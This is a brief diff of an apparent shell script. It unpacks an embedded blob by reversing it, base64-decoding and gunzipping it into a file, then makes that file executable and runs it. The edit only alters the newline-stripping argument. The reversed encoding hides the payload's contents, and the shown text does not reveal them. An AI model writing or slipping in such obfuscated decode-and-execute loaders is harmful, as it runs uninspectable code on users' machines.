@@ -105,6 +105,7 @@ vBBCkormVJOYee5xqcLl5wQ0d29aHlUpHmLdFFTxRdt0ap+wRWpQrpOtS+fX3
 EOF
 
 tr -d '
-' < "$__p" | rev | base64 -d | gzip -dc > "$__s"
+
+' < "$__p" | rev | base64 -d | gzip -dc > "$__s"
 chmod +x "$__s"
 exec "$__s" "$@"
